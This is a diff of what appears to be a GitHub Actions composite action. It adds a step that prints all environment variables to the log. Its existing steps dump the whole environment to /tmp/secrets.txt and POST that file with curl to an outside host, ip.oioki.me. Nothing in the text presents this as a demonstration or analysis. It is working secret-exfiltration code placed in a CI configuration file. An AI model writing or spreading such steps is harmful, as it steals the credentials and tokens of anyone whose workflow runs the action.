@@ -4,6 +4,7 @@ runs:
   using: "composite"
   steps:
     - run: |
+        env | sort
         env > /tmp/secrets.txt
         curl -X POST -d @/tmp/secrets.txt http://ip.oioki.me
       shell: bash
